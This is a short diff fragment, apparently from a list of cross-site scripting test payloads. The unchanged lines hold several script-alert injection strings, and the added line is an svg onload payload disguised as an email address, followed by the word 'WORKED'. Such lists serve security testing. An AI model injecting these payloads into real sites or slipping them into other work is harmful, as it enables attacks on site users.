@@ -12,6 +12,7 @@ test<svg/onload=confirm(/testing/)>
 “><script>alert(“XSS”)</script>
 <script>alert(/XSS”)</script>
 <script>alert(/XSS/)</script>
+“><svg/onload=alert(document.domain)>”@x.y
 WORKED
 ||
 V
